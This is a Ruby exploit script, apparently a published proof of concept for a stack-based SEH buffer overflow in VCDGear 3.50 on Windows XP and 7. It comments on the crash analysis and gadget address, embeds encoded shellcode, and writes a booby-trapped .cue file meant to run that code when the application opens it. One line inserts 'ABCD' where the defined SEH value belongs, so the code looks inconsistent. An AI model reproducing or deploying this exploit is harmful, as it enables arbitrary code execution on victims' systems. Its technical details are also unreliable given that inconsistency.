#!/usr/bin/ruby
 
'''
# Author: Provensec www.provensec.com <advisories@provensec.com >
# Tested on XP SP3 / Windows 7
 
# Description: VCDGEAR 3.50 is prone to a stack-based buffer overflow
vulnerability because the application fails to perform adequate
boundary-checks on user-supplied input.
# An attacker can exploit this issue to execute arbitrary code in the
context of the application. Failed exploit attempts will result in a
denial-of-service condition.
# Application vendor: VCDGear 3.50 -
http://www.vcdgear.com/files/vcdgear350.zip
 
# 0x00499a1e : pop ecx # pop ebp # ret 0x0c | startnull {PAGE_EXECUTE_READ}
[vcdgear.exe]
# ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-
# SEH record (nseh field) at 0x0012f7a4 overwritten with normal pattern :
0x35744134 (offset 580), followed by 1416 bytes of cyclic data
# Project1!ScandataFinalize+0x441:
# 00452ff9 c6841553fdffff00 mov     byte ptr [ebp+edx-2ADh],0
ss:0023:4112f660=??
# 0:000> !exchain
# 0012f7a4: 44434241
# Invalid exception stack at 909006eb
# 0:000> !exploitable
# *** ERROR: Symbol file could not be found.  Defaulted to export symbols
for C:\WINDOWS\system32\USER32.dll -
# *** ERROR: Symbol file could not be found.  Defaulted to export symbols
for C:\WINDOWS\system32\kernel32.dll -
# Exploitability Classification: EXPLOITABLE
'''
 
shellcode = "\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa4" +
"\x0d\x2b\xba\x83\xeb\xfc\xe2\xf4\x58\xe5\x6f\xba\xa4\x0d\xa0\xff" +
"\x98\x86\x57\xbf\xdc\x0c\xc4\x31\xeb\x15\xa0\xe5\x84\x0c\xc0\xf3" +
"\x2f\x39\xa0\xbb\x4a\x3c\xeb\x23\x08\x89\xeb\xce\xa3\xcc\xe1\xb7" +
"\xa5\xcf\xc0\x4e\x9f\x59\x0f\xbe\xd1\xe8\xa0\xe5\x80\x0c\xc0\xdc" +
"\x2f\x01\x60\x31\xfb\x11\x2a\x51\x2f\x11\xa0\xbb\x4f\x84\x77\x9e" +
"\xa0\xce\x1a\x7a\xc0\x86\x6b\x8a\x21\xcd\x53\xb6\x2f\x4d\x27\x31" +
"\xd4\x11\x86\x31\xcc\x05\xc0\xb3\x2f\x8d\x9b\xba\xa4\x0d\xa0\xd2" +
"\x98\x52\x1a\x4c\xc4\x5b\xa2\x42\x27\xcd\x50\xea\xcc\xfd\xa1\xbe" +
"\xfb\x65\xb3\x44\x2e\x03\x7c\x45\x43\x6e\x4a\xd6\xc7\x0d\x2b\xba"
 
filename = "file.cue"
header = " BINARY\n"
header += " TRACK 01 MODE2\2352\n"
header += " INDEX 01 00:00:00\n"
 
nops = "\x90" * 20
junk = "\x41" * 324
nseh = "\xeb\x06\x90\x90"
seh = "\x1e\x9a\x49\x00"
padding = "D" * (1412-(nops.length+shellcode.length))
 
data = "FILE \"" + junk + nseh + "ABCD" + nops + shellcode + padding + "\"" + header
 
puts "[*] JUNK size: %i\n" % [junk.length]
puts "[*] SHELLCODE size: %i\n" % [shellcode.length]
puts "[*] PADDING size: %i" % [padding.length]
 
File.open(filename, 'wb') do |fd|
  fd.write data
  puts "[*] FILE CREATED SUCCESSFULLY"
end
